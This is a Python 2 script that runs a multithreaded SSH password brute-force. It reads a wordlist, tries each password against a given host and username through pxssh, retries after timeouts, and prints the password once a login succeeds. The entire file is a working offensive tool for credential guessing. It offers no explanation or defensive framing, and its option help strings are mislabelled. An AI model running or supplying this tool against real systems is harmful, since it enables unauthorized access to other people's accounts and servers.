import pxssh
import optparse
import time
from threading import *
 
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
 
def Connect(host, user, password, release):
    global Found
    global Fails
 
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print "[+] Password Found : " + password
        Found = True
 
    except Exception, e:
 
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            Connect(host, user, password, False)
 
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            Connect(host, user, password, False)
 
    finally:
        if release:
            connection_lock.release()
 
def main():
    parser = optparse.OptionParser(usage='-H <TargetHost> -u <User> -F <PasswordList>')
    parser.add_option('-H', dest = 'TargetHost', type = 'string' , help ='Specify Target Host')
    parser.add_option('-u', dest = 'username', type = 'string' , help ='Specify Target Host')
    parser.add_option('-F', dest = 'passFile', type = 'string' , help ='Specify Target Host')
    (options, args) = parser.parse_args()
 
    host = options.TargetHost
    username = options.username
    passFile = options.passFile
 
    if host == None or passFile == None or username == None:
        print parser.usage
        exit(0)
 
    fn = open(passFile, 'r')
    for line in fn.readlines():
        if Found:
            print "[*] Exiting : password found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting : Too many Socket Timeouts"
            exit(0)
 
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing : " + str(password)
        t = Thread(target = Connect, args = (host, username, password, True))
        child = t.start()
 
if __name__ == '__main__':
    main()


